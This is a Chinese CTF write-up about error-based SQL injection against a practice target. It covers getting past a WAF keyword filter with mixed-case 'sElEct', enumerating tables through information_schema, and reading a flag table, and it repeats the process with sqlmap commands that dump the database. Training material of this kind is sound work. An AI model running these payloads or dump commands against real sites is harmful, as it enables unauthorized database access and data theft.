---
title: SQL报错注入实战
tags: Web漏洞攻击
categories: CTF比赛
top: 16
---
## 手工注入过程
 1. 首先我们拿到一个靶机网站，随便输入一个密码，无任何回显，然后我们进行抓包判断，查看源代码发现加入tips参数能出报错提示
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162455485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162503191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
 2. 可初步判断可以使用SQL报错注入进行注入攻击，然后我们对name变量进行插入恶意语句
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162519249.png)
<!--more-->
 3. 发现我们的select关键词被WAF过滤了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162548472.png)
 4. 然后我们采用大小写绕过的方式，成功回显
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162608918.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162617134.png)
 5. 我们成功绕过WAF后，就可以正式展开攻击了。攻击的方式是将select 1中的1替换成我们想要查询的参数，这里我们替换成`group_concat(table_name) from information_schema.tables where table_schema=database()`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162658776.png)
 6. 执行成功后，可以看到所有的数据库名，fl4g和users
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162719437.png)
 7. 然后我们再进一步查询相应数据库的字段名，我们这里要查询的是fl4g这个数据库，查询语句为`sElEct group_concat(column_name) from information_schema.columns where table_name='fl4g'`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162749320.png)
 8. 最后查询语句替换为sElEct flag from fl4g，直接出flag值
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162809150.png)
## Sqlmap自动化注入
 1. 这里介绍第二种方式，使用sqlmap进行自动化注入的方式
首先我们用burpsuite神器进行抓包，将抓获的内容保存为request.txt文件
<!--more-->
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162852232.png)
2. 然后键入如下命令`sqlmap -r request.txt --dbms=mysql`，然后判断出存在POST注入漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325162949388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
3. 然后切换命令，爆破出数据库名称`sqlmap -r request.txt --dbs --dbms=mysql –batch`，这里我们的目标是note数据库
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021032516301327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
4. 然后指定数据库，爆出表名`sqlmap -r request.txt --dbs -D note --tables --dbms=mysql –batch`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325163031404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
5. 然后爆出对应的字段名`sqlmap -r request.txt --dbs -D note -T fl4g --columns --dbms=mysql –batch`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325163051891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)
6. 最后爆破出flag值`sqlmap -r request.txt --dbs -D note -T fl4g -C flag --dbms=mysql --batch --dump`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210325163109890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70)

